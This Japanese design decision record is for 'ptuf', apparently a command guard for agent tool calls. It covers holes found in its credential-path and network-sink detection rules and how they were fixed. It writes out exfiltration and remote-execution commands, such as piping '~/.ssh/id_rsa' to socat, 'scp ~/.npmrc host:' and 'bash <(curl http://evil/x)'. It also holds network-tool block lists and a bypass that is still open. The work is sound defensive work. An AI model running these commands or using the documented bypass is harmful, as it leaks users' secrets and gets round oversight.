# ADR 0003 — 形式手法で発見したルール横断の穴 (2026-07)

## Status

Accepted (2026-07-02).

## Context

決定コアの代数則・hardDeny 不可侵性・全域性 / fail-closed は proptest で
広く形式検証済みだが、「複数モジュールにまたがる意図されたセキュリティ
不変条件」はまだ形式化されていなかった。本イテレーションでは形式手法
(cross-cutting proptest プロパティ) で既存ルールを検査し、そこで炙り出した
穴を修正して回帰ネットとして恒久化する。

ptuf には機密 path 分類器が 2 系統ある。設計上は「同じ shape 集合を分類する」
はずだが、両者を突き合わせる property が無かったため不整合が残っていた。

- `src/rules/patterns.rs` の `SENSITIVE_PATH` — Bash 系ルール
  (`sensitive-path-to-network` / `sensitive-bash-read`) が
  `matches_sensitive_path` / `argv_references_sensitive` 経由で使用。
- `src/facts/sensitive.rs` の `classify` / `PROBES` — `facts.sensitive` を埋め、
  ファイルツール系 `sensitive-read` が使用。

| ID | 穴 | 重大度 |
| --- | --- | --- |
| A | npmrc/pypirc の先頭 `\b` アンカーで Bash 側が実ファイルを取り逃す | High |
| B | SSH 鍵 alternation が DSA 鍵 `id_dsa` を欠く | Medium-High |
| D | network sink に `socat` / `telnet` が欠落 | Medium |
| C | プロセス置換 `bash <(curl …)` の remote pipe 取りこぼし | Low (パーサ限界) |

### 穴 A — npmrc / pypirc のアンカー不整合

`SENSITIVE_PATH` の分岐は `\b(?i-u:\.npmrc)\b` (先頭 `\b` 付き)。`\b` は
直前が word 文字である位置を要求するため、`.` の直前が非 word (`/`・`~`・
行頭) となる `~/.npmrc`・`/home/u/.npmrc`・行頭 `.npmrc` に**マッチせず**、
皮肉にも lookalike の `data.npmrc` だけがマッチしていた。一方 `classify` の
PROBES は `(?i-u:\.npmrc)\b` (先頭アンカー無し) で `~/.npmrc` を捕捉する。
結果:

- `Read ~/.npmrc` → `sensitive-read` が **Deny** (classify 一致)
- `cat ~/.npmrc` → `sensitive-bash-read` は **発火せず**
- `scp ~/.npmrc host:` → `sensitive-path-to-network` も **発火せず** (実 exfil バイパス)

### 穴 B — `id_dsa` 秘密鍵の取りこぼし

両分類器とも `id_(?:rsa|ed25519|ecdsa)` で、DSA 秘密鍵の標準ファイル名
`id_dsa` を欠く。`cat id_dsa` / `scp id_dsa host:` / `Read id_dsa` が素通り。

### 穴 D — network sink の取りこぼし

`NETWORK_SINK_HEADS` は `curl wget nc ncat scp rsync ftp sftp` で、exfil で
常用される `socat` / `telnet` が欠落。`cat ~/.ssh/id_rsa | socat - TCP:host:443`
型が発火しない。

### 穴 C — remote-script-pipe のプロセス置換

`bash <(curl http://evil/x)` は remote script を取得実行するが、shell パーサは
プロセス置換 `<(…)` の本体を意図的に opaque な word へ畳み込む
(`src/facts/shell.rs` モジュール doc)。remote-script-pipe は内側 `curl` を
観測できない。コマンド置換本体の re-entry は ADR 0008 で解消済み。
プロセス置換 `<(…)` は引き続き opaque (本 ADR の穴 C / known_gap)。

## Decision

### A — npmrc/pypirc アンカー統一

`SENSITIVE_PATH` (patterns.rs) と PROBES (sensitive.rs) の npmrc/pypirc 分岐を、
ssh/aws と同じパス境界アンカー
`(?:^|/|\s|(?:~|$HOME|${HOME})/)(?i-u:\.npmrc)\b` に統一する。両者を一致させ
実ファイル (`~/.npmrc` 等) を捕捉、lookalike (`data.npmrc`) は非マッチに。

### B — SSH 鍵ファミリ網羅

両正規表現の SSH 鍵 alternation を `id_(?:rsa|dsa|ecdsa|ed25519)` に拡張する。

### D — network sink 追加

`NETWORK_SINK_HEADS` に `socat` / `telnet` を追加する。`ssh` は
`ssh -i ~/.ssh/id_rsa host` 等の正当用途で偽陽性を大量発生させるため
**追加しない**。

### C — known_gap として pin

到達不能な穴を無理に塞ぐ (検証不能な侵襲的変更) より、既知の限界として
bypass corpus に `known_gap` (allow) で固定する。将来パーサが内側コマンドを
surface する変更を入れると期待が破れ、意図的な corpus / ADR 更新を強制する。

## Consequences

### Positive

- 2 系統の分類器が npmrc/pypirc/DSA 鍵で一致し、Bash 経路の実 exfil
  (`scp ~/.npmrc host:` / `scp id_dsa host:`) が Critical Deny になる。
- `socat` / `telnet` 経由の機密流出が Deny になる。
- 分類器パリティが property で恒久的に縛られ、片方だけ shape を追加した際の
  ドリフトが CI で検出される。

### Negative

- network sink 拡張は `socat` / `telnet` を機密 path と共起させる稀な正当
  ワークフローで偽陽性になりうる (Deny)。allowlist / pack 無効化で回避可能。
- 穴 C はパーサ限界のため未修正。

### Known limitations (本イテレーション外 / 継続)

- C `bash <(curl …)` — プロセス置換 opaque 化 (本 ADR で known_gap 固定)
- ADR 0002 の ~~B1~~/B2/~~B5~~/C2 (~~Unicode homoglyph~~ / symlink /
  ~~cmdsubst~~ / 変数 head)。B1 は ADR 0007、B5 は ADR 0008 で解消
- ~~C3 `rm -rf /e*` glob 展開前 bypass~~ — 解消 (ADR 0006)

## Implementation map

| 項目 | ファイル | 主要変更 |
| --- | --- | --- |
| A | `src/rules/patterns.rs`, `src/facts/sensitive.rs` | npmrc/pypirc アンカー統一 |
| B | `src/rules/patterns.rs`, `src/facts/sensitive.rs` | `id_dsa` 追加 |
| D | `src/rules/sensitive_net.rs` | `socat` / `telnet` を sink に追加 |
| C | `tests/bypass/corpus.jsonl` | known_gap で pin (コード変更なし) |
| P1 | `src/rules/patterns.rs`, `src/testing/proptest.rs` | 分類器パリティ property + generator |
| P2 | `src/facts/sensitive.rs` | SSH 鍵ファミリ網羅 property |
| P3 | `tests/engine_proptest.rs` | ルール横断挙動パリティ property |
| Tests | `tests/bypass/corpus.jsonl` | must_catch 8 + known_gap 1 |
| Doc | `docs/design/policy-packs.md`, 本 ADR | 設計追従 |
